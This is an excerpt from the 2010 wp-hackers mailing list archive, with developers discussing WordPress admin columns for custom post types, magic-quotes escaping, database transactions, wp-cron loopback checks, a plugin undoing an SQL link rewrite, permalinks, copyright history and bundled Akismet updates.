From wp-hackers at pdclark.com  Fri Oct  1 04:08:43 2010
From: wp-hackers at pdclark.com (Paul Clark)
Date: Thu, 30 Sep 2010 21:08:43 -0700
Subject: [wp-hackers] Editing the Posts List view for Custom Post Types
In-Reply-To: <etPan.4ca509a5.19495cff.37c@scrumpyjack.local>
References: <etPan.4ca509a5.19495cff.37c@scrumpyjack.local>
Message-ID: <AANLkTikh+hpZ1Cd=XiDZyjMTesamm+TrDaaS8hPQU8dk@mail.gmail.com>

Hi Simon,

I recently did this for a client. You can view the code here:
http://wordpress.pastebin.com/WZyDpqjA
and a screenshot here:
http://pdclark.com/wp-hackers/custom-taxonomy-columns.jpg

In this case, the client was a horse sanctuary. So, the custom post type,
"resident" is horses. Taxonomies were Adoption Status, Breed, Color, etc.
Clicking the taxonomy term names will filter the listing to posts in that
taxonomy.

I based that code off of this example, which uses the same method to display
Post thumbnails in a column:
http://wpengineer.com/1960/display-post-thumbnail-post-page-overview/

I also contracted Kawauso to make a plugin last week that would list any
custom field value in a column for any post type, and allow that value to be
edited via AJAX just clicking on it. He did a really great job. It's
excellent for things like editing All in One SEO Pack values very, very
quickly. It is enabled for different post types and meta fields through a
filter.

I haven't released that plugin outside client sites, but you can download it
here: http://pdclark.com/wp-hackers/meta-columns.zip

And you can see a screenshot here:
http://pdclark.com/wp-hackers/meta-columns-screenshot.jpg

A usage example is included in readme.txt and in meta-columns.php.

Paul Clark


On Thu, Sep 30, 2010 at 3:05 PM, Simon Hamp <simon at flipstorm.co.uk> wrote:

> Hi all,
>
> Does anyone know of an 'easy' way to customise the Posts List
> (wp-admin/edit.php) for custom post types?
>
> I'm thinking adding extra columns, sorting.... that kind of thing. But I
> don't want to change it for all post types, just my custom ones.
>
> A complex example: showing a list of custom taxonomies that have been
> associated with each post in the table view.
>
> Really appreciate any input.
>
> Regards
> Simon
>
> On 2010-09-30 22:56:18 +0100, wp-hackers-bounces at lists.automattic.comWrote:
>
> >Hi all,
> >
> >I have a custom feature in a plugin that can be supported by post
> >types by calling add_post_type_support( 'post_type',
> >'my-super-feature' ).
> >
> >I'd like to get a list of the post types that support
> >'my-super-feature' so I can add a meta box to each of the supported
> >post type screens, but there doesn't seem to be a function that
> >returns all the post types that support a certain feature. I thought
> >we had something like get_supported_post_types('my-super-feature') but
> >I can't find anything like that.
> >
> >Any suggestions?
> >
> >John
> >_______________________________________________
> >wp-hackers mailing list
> >wp-hackers at lists.automattic.com
> >http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From lox.dev at knc.nc  Fri Oct  1 05:09:24 2010
From: lox.dev at knc.nc (Lox)
Date: Fri, 1 Oct 2010 16:09:24 +1100
Subject: [wp-hackers] Implementing databse transaction in Wordpress
Message-ID: <AANLkTindBfnkhf5m4CfsS35e2i2bT8CpS8WFTLHGGTjF@mail.gmail.com>

Hello,

Today, I faced a problem with one of my customers. The table wp_usermeta had
something wrong and I had to repair it (using SQL repair query)

The side effect of that problem are many partial users records for the users
that registered while the table was broken: those users had a record in
wp_users table BUT NOT in wp_usermeta (as it was broken).

This could have been easily avoided using database transactions. Is there
any reason why this basic data integrity security layer hasn't been
implemented in Wordpress?

Regards.

-- 
Lox
lox.dev at knc.nc

From lox.dev at knc.nc  Fri Oct  1 05:31:16 2010
From: lox.dev at knc.nc (Lox)
Date: Fri, 1 Oct 2010 16:31:16 +1100
Subject: [wp-hackers] wp_magic_quotes makes me sad panda
In-Reply-To: <AANLkTi=OHbtbt4491OAcbxoCXXGeaBooLTm_Y=6-MhUw@mail.gmail.com>
References: <20100927104930.8675110D88A@lists.luv.wordpress.org>
	<AANLkTimJHyH+nJGxVgTf3oJ4yc34Op1GdvK=orgXek8A@mail.gmail.com>
	<AANLkTikDjjiW2bGUMm_agib_GtKFnwKLaXd6OgPD4bjK@mail.gmail.com>
	<6057B3C9-A0CD-4262-BD14-E13BB6A0F2B1@newclarity.net>
	<AANLkTi=OHbtbt4491OAcbxoCXXGeaBooLTm_Y=6-MhUw@mail.gmail.com>
Message-ID: <AANLkTi=6M2S8MWgrxi4bC3ER_bWZO49QMWtdhapRo42W@mail.gmail.com>

Hi,

Escaping automatically all GPC data is definitely a performance issue and
not a good practice. It has been recognized like so for a long time now and
is now deprecated (
http://www.php.net/manual/en/security.magicquotes.whynot.php)

Programmers that begin php dev with wordpress, will definably end up behind
bad programmers no escaping their data when needed and thus writing
unsecured code.

In my opinion, wordpress should NOW:

- plan the change to using un-escaped GPC data and communicate about it to
all plugin devs.

- provides wrapper functions to access un-escaped GPC data, that could be
extended in the future with data checking/filtering

- communicate about those functions as THE way to get Request data, and
about how to properly escape data and when

The reason stating that wordpres has to escape GPC data for servers
compatibility is just *a non sense*! As WP adds the slashes autamically, if
magic_quote_gpc is off on the server, it could also remove them
automatically if the server configuation has magic_quote_gpc set to on.

Regards

-- 
Lox
lox.dev at knc.nc

From peter.westwood at ftwr.co.uk  Fri Oct  1 10:22:40 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 1 Oct 2010 11:22:40 +0100
Subject: [wp-hackers] Implementing databse transaction in Wordpress
In-Reply-To: <AANLkTindBfnkhf5m4CfsS35e2i2bT8CpS8WFTLHGGTjF@mail.gmail.com>
References: <AANLkTindBfnkhf5m4CfsS35e2i2bT8CpS8WFTLHGGTjF@mail.gmail.com>
Message-ID: <0E444D73-B17D-43AB-A82C-0918D5A9EBE9@ftwr.co.uk>

Hi,
On 1 Oct 2010, at 06:09, Lox wrote:

> Today, I faced a problem with one of my customers. The table wp_usermeta had
> something wrong and I had to repair it (using SQL repair query)
> 
> The side effect of that problem are many partial users records for the users
> that registered while the table was broken: those users had a record in
> wp_users table BUT NOT in wp_usermeta (as it was broken).
> 
> This could have been easily avoided using database transactions. Is there
> any reason why this basic data integrity security layer hasn't been
> implemented in Wordpress?


Because in general they are not needed and they add extra overhead

Also transactions are not supported on all table types and you might want to use a different table type for performance reasons

You would do better looking in to what corrupted the table and how you could have detected that.

Transactions would have only helped you identify you had a problem sooner not fixed the problem!
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From peter.westwood at ftwr.co.uk  Fri Oct  1 10:54:30 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 1 Oct 2010 11:54:30 +0100
Subject: [wp-hackers] wp_magic_quotes makes me sad panda
In-Reply-To: <AANLkTi=6M2S8MWgrxi4bC3ER_bWZO49QMWtdhapRo42W@mail.gmail.com>
References: <20100927104930.8675110D88A@lists.luv.wordpress.org>
	<AANLkTimJHyH+nJGxVgTf3oJ4yc34Op1GdvK=orgXek8A@mail.gmail.com>
	<AANLkTikDjjiW2bGUMm_agib_GtKFnwKLaXd6OgPD4bjK@mail.gmail.com>
	<6057B3C9-A0CD-4262-BD14-E13BB6A0F2B1@newclarity.net>
	<AANLkTi=OHbtbt4491OAcbxoCXXGeaBooLTm_Y=6-MhUw@mail.gmail.com>
	<AANLkTi=6M2S8MWgrxi4bC3ER_bWZO49QMWtdhapRo42W@mail.gmail.com>
Message-ID: <B15BE91E-ACD1-4D27-8183-A31AEB4EBE5C@ftwr.co.uk>

Hi,

On 1 Oct 2010, at 06:31, Lox wrote:

> 
> Escaping automatically all GPC data is definitely a performance issue and
> not a good practice. It has been recognized like so for a long time now and
> is now deprecated (
> http://www.php.net/manual/en/security.magicquotes.whynot.php)
> 
> Programmers that begin php dev with wordpress, will definably end up behind
> bad programmers no escaping their data when needed and thus writing
> unsecured code.
> 
> In my opinion, wordpress should NOW:
> 
> - plan the change to using un-escaped GPC data and communicate about it to
> all plugin devs.
> 
> - provides wrapper functions to access un-escaped GPC data, that could be
> extended in the future with data checking/filtering
> 
> - communicate about those functions as THE way to get Request data, and
> about how to properly escape data and when
> 
> The reason stating that wordpres has to escape GPC data for servers
> compatibility is just *a non sense*! As WP adds the slashes autamically, if
> magic_quote_gpc is off on the server, it could also remove them
> automatically if the server configuation has magic_quote_gpc set to on.
> 


If you want to test and provide a patch for every single plugin in the repo so that it works once this is done and before it is done then we might be able to consider this.

Otherwise you are just flogging a dead horse - we value backwards compatibility and our ability to work in as many hosting environments as possible.

This is what has made WordPress a successful platform

A project that runs in so many different locations as WordPress does has to work with the lowest common denominator of scenarios and can't change just because something is a better way to do it now.

Don't blame us because PHP used to be so broken in this respect :-( we are doing the best for the users we can do to keep them secure!

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From philip at frumph.net  Fri Oct  1 16:01:32 2010
From: philip at frumph.net (Philip M. Hofer (Frumph))
Date: Fri, 1 Oct 2010 09:01:32 -0700
Subject: [wp-hackers] code to do a loopback test for wp-cron
Message-ID: <BF2CFAA9C8B84E41AE60B4E23478E599@frumph.net>

I'm looking for a lead on how I can get a wp-cron loopback test going that would i dunno add a notices to the admin_notices hook on if it fails when enabled ..

I'm getting a few support calls about 'missed schedules' and i'm looking for a way to 'test' whether or not its a loopback situation.   Several times it's been the UTC setting; just by setting it to a city the missed schedules stopped happening, but more often then not its the communication back with itself.

Does anyone have any ideas or a plugin maybe that already does it?  Does a check whether or not it can communicate with itself?

- Phil


From donncha at linux.ie  Fri Oct  1 16:07:00 2010
From: donncha at linux.ie (Donncha O Caoimh)
Date: Fri, 01 Oct 2010 17:07:00 +0100
Subject: [wp-hackers] code to do a loopback test for wp-cron
In-Reply-To: <BF2CFAA9C8B84E41AE60B4E23478E599@frumph.net>
References: <BF2CFAA9C8B84E41AE60B4E23478E599@frumph.net>
Message-ID: <4CA60724.9000107@linux.ie>

WP Super Cache checks if the host can make a request to itself and 
reports an error if not. It's fairly trivial code, and probably in 
wp-cache.php if you have that plugin.

Donncha

On 01/10/10 17:01, Philip M. Hofer (Frumph) wrote:
> I'm looking for a lead on how I can get a wp-cron loopback test going
> that would i dunno add a notices to the admin_notices hook on if it
> fails when enabled ..
>
> I'm getting a few support calls about 'missed schedules' and i'm
> looking for a way to 'test' whether or not its a loopback situation.
> Several times it's been the UTC setting; just by setting it to a city
> the missed schedules stopped happening, but more often then not its
> the communication back with itself.
>
> Does anyone have any ideas or a plugin maybe that already does it?
> Does a check whether or not it can communicate with itself?
>
> - Phil
>

From philip at frumph.net  Fri Oct  1 16:11:00 2010
From: philip at frumph.net (Philip M. Hofer (Frumph))
Date: Fri, 1 Oct 2010 09:11:00 -0700
Subject: [wp-hackers] code to do a loopback test for wp-cron
In-Reply-To: <4CA60724.9000107@linux.ie>
References: <BF2CFAA9C8B84E41AE60B4E23478E599@frumph.net>
	<4CA60724.9000107@linux.ie>
Message-ID: <21B02AE535704D1B988B044920E28648@frumph.net>

Gotta have that plugin ;)  It's the best thing since sliced bread to save on 
processor usage with larger sites.

Thanks Donncha


----- Original Message ----- 
From: "Donncha O Caoimh" <donncha at linux.ie>
To: <wp-hackers at lists.automattic.com>
Sent: Friday, October 01, 2010 9:07 AM
Subject: Re: [wp-hackers] code to do a loopback test for wp-cron


> WP Super Cache checks if the host can make a request to itself and reports 
> an error if not. It's fairly trivial code, and probably in wp-cache.php if 
> you have that plugin.
>
> Donncha
>
> On 01/10/10 17:01, Philip M. Hofer (Frumph) wrote:
>> I'm looking for a lead on how I can get a wp-cron loopback test going
>> that would i dunno add a notices to the admin_notices hook on if it
>> fails when enabled ..
>>
>> I'm getting a few support calls about 'missed schedules' and i'm
>> looking for a way to 'test' whether or not its a loopback situation.
>> Several times it's been the UTC setting; just by setting it to a city
>> the missed schedules stopped happening, but more often then not its
>> the communication back with itself.
>>
>> Does anyone have any ideas or a plugin maybe that already does it?
>> Does a check whether or not it can communicate with itself?
>>
>> - Phil
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> 



From simon at flipstorm.co.uk  Fri Oct  1 19:17:23 2010
From: simon at flipstorm.co.uk (Simon Hamp)
Date: Fri, 1 Oct 2010 20:17:23 +0100
Subject: [wp-hackers] Editing the Posts List view for Custom Post Types
In-Reply-To: <AANLkTikh+hpZ1Cd=XiDZyjMTesamm+TrDaaS8hPQU8dk@mail.gmail.com>
References: <etPan.4ca509a5.19495cff.37c@scrumpyjack.local>
	<AANLkTikh+hpZ1Cd=XiDZyjMTesamm+TrDaaS8hPQU8dk@mail.gmail.com>
Message-ID: <AANLkTimFi4Bkg+U2pMaHWVuWW5sWfZj=zr5X1-A754pW@mail.gmail.com>

Thanks for your help guys :) you've steered me in the right direction!

Much appreciated
Simon

On 1 October 2010 05:08, Paul Clark <wp-hackers at pdclark.com> wrote:

> Hi Simon,
>
> I recently did this for a client. You can view the code here:
> http://wordpress.pastebin.com/WZyDpqjA
> and a screenshot here:
> http://pdclark.com/wp-hackers/custom-taxonomy-columns.jpg
>
> In this case, the client was a horse sanctuary. So, the custom post type,
> "resident" is horses. Taxonomies were Adoption Status, Breed, Color, etc.
> Clicking the taxonomy term names will filter the listing to posts in that
> taxonomy.
>
> I based that code off of this example, which uses the same method to
> display
> Post thumbnails in a column:
> http://wpengineer.com/1960/display-post-thumbnail-post-page-overview/
>
> I also contracted Kawauso to make a plugin last week that would list any
> custom field value in a column for any post type, and allow that value to
> be
> edited via AJAX just clicking on it. He did a really great job. It's
> excellent for things like editing All in One SEO Pack values very, very
> quickly. It is enabled for different post types and meta fields through a
> filter.
>
> I haven't released that plugin outside client sites, but you can download
> it
> here: http://pdclark.com/wp-hackers/meta-columns.zip
>
> And you can see a screenshot here:
> http://pdclark.com/wp-hackers/meta-columns-screenshot.jpg
>
> A usage example is included in readme.txt and in meta-columns.php.
>
> Paul Clark
>
>
> On Thu, Sep 30, 2010 at 3:05 PM, Simon Hamp <simon at flipstorm.co.uk> wrote:
>
> > Hi all,
> >
> > Does anyone know of an 'easy' way to customise the Posts List
> > (wp-admin/edit.php) for custom post types?
> >
> > I'm thinking adding extra columns, sorting.... that kind of thing. But I
> > don't want to change it for all post types, just my custom ones.
> >
> > A complex example: showing a list of custom taxonomies that have been
> > associated with each post in the table view.
> >
> > Really appreciate any input.
> >
> > Regards
> > Simon
> >
> > On 2010-09-30 22:56:18 +0100,
> wp-hackers-bounces at lists.automattic.comWrote:
> >
> > >Hi all,
> > >
> > >I have a custom feature in a plugin that can be supported by post
> > >types by calling add_post_type_support( 'post_type',
> > >'my-super-feature' ).
> > >
> > >I'd like to get a list of the post types that support
> > >'my-super-feature' so I can add a meta box to each of the supported
> > >post type screens, but there doesn't seem to be a function that
> > >returns all the post types that support a certain feature. I thought
> > >we had something like get_supported_post_types('my-super-feature') but
> > >I can't find anything like that.
> > >
> > >Any suggestions?
> > >
> > >John
> > >_______________________________________________
> > >wp-hackers mailing list
> > >wp-hackers at lists.automattic.com
> > >http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From lox.dev at knc.nc  Fri Oct  1 22:30:47 2010
From: lox.dev at knc.nc (Lox)
Date: Sat, 2 Oct 2010 09:30:47 +1100
Subject: [wp-hackers] wp_magic_quotes makes me sad panda
In-Reply-To: <B15BE91E-ACD1-4D27-8183-A31AEB4EBE5C@ftwr.co.uk>
References: <20100927104930.8675110D88A@lists.luv.wordpress.org>
	<AANLkTimJHyH+nJGxVgTf3oJ4yc34Op1GdvK=orgXek8A@mail.gmail.com>
	<AANLkTikDjjiW2bGUMm_agib_GtKFnwKLaXd6OgPD4bjK@mail.gmail.com>
	<6057B3C9-A0CD-4262-BD14-E13BB6A0F2B1@newclarity.net>
	<AANLkTi=OHbtbt4491OAcbxoCXXGeaBooLTm_Y=6-MhUw@mail.gmail.com>
	<AANLkTi=6M2S8MWgrxi4bC3ER_bWZO49QMWtdhapRo42W@mail.gmail.com>
	<B15BE91E-ACD1-4D27-8183-A31AEB4EBE5C@ftwr.co.uk>
Message-ID: <AANLkTikjT+eDKcjRVfo3n6bWgr25OA4NFkndwzUkw4wN@mail.gmail.com>

2010/10/1 Peter Westwood <peter.westwood at ftwr.co.uk>

> If you want to test and provide a patch for every single plugin in the repo
> so that it works once this is done and before it is done then we might be
> able to consider this.
>

Lol. Come on, any change can be done over time. Think about the deprecated
functions in WP or how it has been announced that next WP major version
won't support the obsolete PHP4. (
http://wordpress.org/news/2010/07/eol-for-php4-and-mysql4/)

See how PHP has started the move to not use magic_quote_gpc years ago, it is
a progressive move witch isn't finished yet, the option is still there and
has been deprecated only since version 5.3.

But, WP hasn't started the change yet.... That is what is wrong.


> Otherwise you are just flogging a dead horse - we value backwards
> compatibility and our ability to work in as many hosting environments as
> possible.
>
> This is what has made WordPress a successful platform
>
> A project that runs in so many different locations as WordPress does has to
> work with the lowest common denominator of scenarios and can't change just
> because something is a better way to do it now.
>

Come on, as wordpress escapes GPC vars on any hosting environments needing
it, it is then able to unescape those on wrongly configured hosting
environments needing it, making WP as compatible as it is now.


>
> Don't blame us because PHP used to be so broken in this respect :-( we are
> doing the best for the users we can do to keep them secure!
>

I do not blame anyone for how wordpress is. The purpose of my comments on
that subject is simply to have that change *planned*. And yes I am aware
that such a change is a hudge task, not only for plugins, but for wordpress
core. Every simple piece of code has to get reviewed to escape needed vars
and it can be a source of security holes...

So here comes my solution to start the move: provide to plugin devs some
wrapper functions to access unescaped GPC vars and communicate about it.

Cheers

-- 
Lox
lox.dev at knc.nc

From lox.dev at knc.nc  Fri Oct  1 22:34:45 2010
From: lox.dev at knc.nc (Lox)
Date: Sat, 2 Oct 2010 09:34:45 +1100
Subject: [wp-hackers] Implementing databse transaction in Wordpress
In-Reply-To: <0E444D73-B17D-43AB-A82C-0918D5A9EBE9@ftwr.co.uk>
References: <AANLkTindBfnkhf5m4CfsS35e2i2bT8CpS8WFTLHGGTjF@mail.gmail.com>
	<0E444D73-B17D-43AB-A82C-0918D5A9EBE9@ftwr.co.uk>
Message-ID: <AANLkTinOT_R1pMeD+PbaWqK2a-nOzxGSrnCFVm2umWhu@mail.gmail.com>

2010/10/1 Peter Westwood <peter.westwood at ftwr.co.uk>

> Because in general they are not needed and they add extra overhead
>
> Also transactions are not supported on all table types and you might want
> to use a different table type for performance reasons
>
> You would do better looking in to what corrupted the table and how you
> could have detected that.
>

I wish I could detect a server crash....


>
> Transactions would have only helped you identify you had a problem sooner
> not fixed the problem!
>

Of course, but I would have kept my data's integrity.

-- 
Lox
lox.dev at knc.nc

From wp-hackers at google-adsense-templates.co.uk  Sat Oct  2 00:05:43 2010
From: wp-hackers at google-adsense-templates.co.uk (wp-hackers at google-adsense-templates.co.uk)
Date: Sat, 02 Oct 2010 01:05:43 +0100
Subject: [wp-hackers] Reposter Plugin and SQL Strange Behaviour
Message-ID: <l4qca65jbfc3k600h7g7n603ll5b86nr5r@4ax.com>

Hi,

I have a very strange problem relating to a plugin
http://www.gurugazette.com/Reposter/ that reposts the oldest post in a
category (basically gives the oldest post the current date/time) and
SQL search and replace command to change some links in the WP
database.

Been running the plugin with no problems on multiple sites prior to
the SQL changes.

Changed some links via an SQL database command, basically changed
these links (affiliate links).

<a href="/buy.php?id=######"><strong>Anchor text now</strong></a>

To

<span class="test" title="test" id="######"><strong>Anchor text
now</strong></span>

Using the SQL commands:

update wp_posts set post_content = replace(post_content,'<a
href="/buy.php?id=','<span class="test" title="test" id="');
update wp_posts set post_content =
replace(post_content,'now</strong></a>','now</strong></span>');

The SQL commands did what they were suppossed to do and everything
worked fine.

The reposter plugin runs at intervals and a couple of days later
rather than the links that had changed being as they are suppossed to
be the code id="######" had gone on any posts that had been processed
by the plugin!

<span class="test" title="test"><strong>Anchor text
now</strong></span>

This has happened on both domains I've made these changes to.

Looking at the posts in question I noticed the old Revisons of the
posts had the correct code, it was only the new version that had been
processed by the plugin that had lost the code id="######".

I also noticed the author name of posts (all posts processed by the
plugin) had lost their author attribution.

Under Revisions it's supposed to look like this:

17 August, 2010 @ 12:18 by Authorname

But it looks like

17 August, 2010 @ 12:18 by 

On ALL posts processed by the plugin (not related to the SQL changes).

I doubt this has anything to do with what's happening, but including
it just in case it's relevant.

It makes no sense why just the id="#####" part of the code would
vanish on the links, everything else is fine the other parts of the
code between the two SQL changes are intact. Of the code this part
(######"><strong>Anchor text) is unchanged with ###### being a unique
number and Anchor text being unique text for every link.

Very confused?????

David
-- 
Monetize your WordPress blog with Search Engine Optimized templates
including AdSense ads http://www.google-adsense-templates.co.uk/

From wpcustomizer at gmail.com  Sat Oct  2 03:51:28 2010
From: wpcustomizer at gmail.com (WP Customizer)
Date: Fri, 1 Oct 2010 20:51:28 -0700
Subject: [wp-hackers] Use a period in permalinks
Message-ID: <AANLkTi=1wL9J1HpWfy5_iCzKLDGo5hSLS8JgTikp0qKN@mail.gmail.com>

I am trying to use a . (period) in a permalink for a page, but it just
changes to a - (dash).  Is there anyway to get this to work with a period, I
want to include a non-whole number as part of the permalink like
mysite.com/hello-world-1.0.1 or mysite.com/1.1

From hanskrentel at yahoo.de  Sat Oct  2 10:11:25 2010
From: hanskrentel at yahoo.de (hakre)
Date: Sat, 2 Oct 2010 10:11:25 +0000 (GMT)
Subject: [wp-hackers] WordPress Copyright?
Message-ID: <537659.36545.qm@web24108.mail.ird.yahoo.com>

While looking for some licensing related stuff I came accross the 
(now inexistant?!) copyright statement in the WordPress package.

This was the original Statement of the code at the time of fork:

>  Copyright notes:
>  
>    b2 is (c) 2001, 2002 Michel Valdrighi - m at tidakada.com - 
>    http://tidakada.com
>  
>  Wherever third party code has been used, credit has been 
>  given in the code's comments.
>  b2 is released under the GPL (see license.txt).

(located in readme.html, r3).

Now that's for the code that has been taken over. Just some commits 
later (r48), Matt Mullenweg decided to remove the copyright string 
documenting the change along with others as "some minor update".

This resulted in the following statement:

>  Copyright notes:
>  
>  Wherever third party code has been used, credit has been 
>  given in the code's comments.
>  WordPress is released under the GPL (see license.txt).

Is there more information available about that change next to the 
commit message? Maybe someone still has some details? Probably 
the comitting developer?

Having more information about that change is greatly appreciated. 

With the information available right now it just looks like the 
removal of the original author's copyright statement which does not 
make any sense at best.

I'd like to learn more.

For documentation purposes I've listed all WordPress Copyright State-
ment related changes with references and texts here:

  http://codex.wordpress.org/User:Hakre/Core/Wordpress_Copyright

-- hakre.

 http://hakre.wordpress.com/




From wordpress at zed1.com  Sat Oct  2 10:31:30 2010
From: wordpress at zed1.com (Mike Little)
Date: Sat, 2 Oct 2010 11:31:30 +0100
Subject: [wp-hackers] Use a period in permalinks
In-Reply-To: <AANLkTi=1wL9J1HpWfy5_iCzKLDGo5hSLS8JgTikp0qKN@mail.gmail.com>
References: <AANLkTi=1wL9J1HpWfy5_iCzKLDGo5hSLS8JgTikp0qKN@mail.gmail.com>
Message-ID: <AANLkTinQ31SBC2j18O4_P8NA9Fjprz4PS967LaqBBTNc@mail.gmail.com>

On 2 October 2010 04:51, WP Customizer <wpcustomizer at gmail.com> wrote:

> I am trying to use a . (period) in a permalink for a page, but it just
> changes to a - (dash).  Is there anyway to get this to work with a period,
> I
> want to include a non-whole number as part of the permalink like
> mysite.com/hello-world-1.0.1 or mysite.com/1.1
> _______________________________________________
>
>
I've not tired it, but this plugin
http://urbangiraffe.com/plugins/advanced-permalinks/ from John Godley, who
works for Automattic, has that feature


Mike
-- 
Mike Little
http://zed1.com/

From eric at eamann.com  Sat Oct  2 14:05:58 2010
From: eric at eamann.com (Eric Mann)
Date: Sat, 2 Oct 2010 07:05:58 -0700
Subject: [wp-hackers] Bundled Plug-ins
Message-ID: <000301cb623a$f1d3b5c0$d57b2140$@com>

I love the idea of distributing Akismet with WordPress.  It's a vital plugin
to any successful blog and a great idea to have that functionality bundled
yet optional.  However . the fact that Akismet is maintained separately from
WP can be a little problematic.  Specifically, a fresh download and install
of WP about 5 minutes ago contains an outdated copy of Akismet.  Installing
a brand new "up-to-date" copy of software and immediately being told there's
an update available conjurs up flashbacks of the endless
update-reboot-update-reboot cycle that drives many people away from
Microsoft Windows.

 

So what can we do to maintain the elegance of bundled plugins without
running the risk of notifying users of new updates less than 5 minutes after
they open a new package?


From paul at codehooligans.com  Sat Oct  2 14:20:42 2010
From: paul at codehooligans.com (Paul)
Date: Sat, 2 Oct 2010 10:20:42 -0400
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <000301cb623a$f1d3b5c0$d57b2140$@com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
Message-ID: <770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>


On Oct 2, 2010, at 10:05 AM, Eric Mann wrote:

> conjurs up flashbacks of the endless
> update-reboot-update-reboot cycle that drives many people away from
> Microsoft Windows.

Really? That is a little dramatic I think. The Akismet upgrade doesn't force you to reboot your server or anything close. 

Would you rather have the plugin excluded from the WordPress core? Then you would need to download and install it separate. Many software distributions, once installed will check it there was an update. This is pretty common practice from what I've seen. 

P-


From chris at chriskdesigns.com  Sat Oct  2 14:55:55 2010
From: chris at chriskdesigns.com (Chris Klosowski)
Date: Sat, 2 Oct 2010 07:55:55 -0700
Subject: [wp-hackers] Implementing databse transaction in Wordpress
In-Reply-To: <AANLkTinOT_R1pMeD+PbaWqK2a-nOzxGSrnCFVm2umWhu@mail.gmail.com>
References: <AANLkTindBfnkhf5m4CfsS35e2i2bT8CpS8WFTLHGGTjF@mail.gmail.com>
	<0E444D73-B17D-43AB-A82C-0918D5A9EBE9@ftwr.co.uk>
	<AANLkTinOT_R1pMeD+PbaWqK2a-nOzxGSrnCFVm2umWhu@mail.gmail.com>
Message-ID: <AANLkTi=Rr9BGhPmF2MxCuiM36Xu5SROBxz1V6pTXexs1@mail.gmail.com>

I make it standard practice to run repairs on my data bases via a cron
script every week, and on more mission critical sites, every few days. I
also do a mysql dump of the site at the same time. It's come in handy a few
times.

Chris Klosowski
chris at chriskdesigns.com
@cklosowski


On Fri, Oct 1, 2010 at 3:34 PM, Lox <lox.dev at knc.nc> wrote:

> 2010/10/1 Peter Westwood <peter.westwood at ftwr.co.uk>
>
> > Because in general they are not needed and they add extra overhead
> >
> > Also transactions are not supported on all table types and you might want
> > to use a different table type for performance reasons
> >
> > You would do better looking in to what corrupted the table and how you
> > could have detected that.
> >
>
> I wish I could detect a server crash....
>
>
> >
> > Transactions would have only helped you identify you had a problem sooner
> > not fixed the problem!
> >
>
> Of course, but I would have kept my data's integrity.
>
> --
> Lox
> lox.dev at knc.nc
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From eric at eamann.com  Sat Oct  2 15:12:07 2010
From: eric at eamann.com (Eric Mann)
Date: Sat, 2 Oct 2010 08:12:07 -0700
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
Message-ID: <001001cb6244$2f30b310$8d921930$@com>

I've just become very sensitive to anything asking me to update immediately
after I install what I'm told is the latest version.  It's a bit confusing
to download a fresh file, install it, and immediately see any kind of
"update available" message.

No, I like the idea of including the plugin with WordPress core ... but it
would be nice if we could somehow update the core download package (the ZIP
file you get when clicking "download" on wordpress.org) when externals are
updated.

> Many software distributions, once installed will check if there was an
update.  This is pretty common practice from what I've seen.

Just because it's a common practice doesn't mean it's the right way to do
things or something we should embrace.  Anything that can potentially
confuse a user is "bad" in my book, common practice or no ...

~Eric

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Paul
Sent: Saturday, October 02, 2010 7:21 AM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Bundled Plug-ins


On Oct 2, 2010, at 10:05 AM, Eric Mann wrote:

> conjurs up flashbacks of the endless
> update-reboot-update-reboot cycle that drives many people away from
> Microsoft Windows.

Really? That is a little dramatic I think. The Akismet upgrade doesn't force
you to reboot your server or anything close. 

Would you rather have the plugin excluded from the WordPress core? Then you
would need to download and install it separate. Many software distributions,
once installed will check it there was an update. This is pretty common
practice from what I've seen. 


P-

_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From ozh at ozh.org  Sat Oct  2 15:26:45 2010
From: ozh at ozh.org (Ozh)
Date: Sat, 2 Oct 2010 17:26:45 +0200
Subject: [wp-hackers] Bundled Plug-ins
In-Reply-To: <001001cb6244$2f30b310$8d921930$@com>
References: <000301cb623a$f1d3b5c0$d57b2140$@com>
	<770469F6-FD70-4ACC-8A39-DB4F5CFBEACB@codehooligans.com>
	<001001cb6244$2f30b310$8d921930$@com>
Message-ID: <AANLkTimeK2wfxoXyHZ7FT=LhMZQ6yzb0cxzEJALavpyg@mail.gmail.com>

While we're on this subject, if anyone has a good explanation on why
Akismet is an "external", I'd be grateful. I don't get why parts of WP
are, well, parts of WP, while other parts of WP are "externals". From
a user POV this does not make a lot of sense IMO.

On Sat, Oct 2, 2010 at 5:12 PM, Eric Mann <eric at eamann.com> wrote:
> I've just become very sensitive to anything asking me to update immediately
> after I install what I'm told is the latest version. ?It's a bit confusing
> to download a fresh file, install it, and immediately see any kind of
> "update available" message.
>
> No, I like the idea of including the plugin with WordPress core ... but it
> would be nice if we could somehow update the core download package (the ZIP
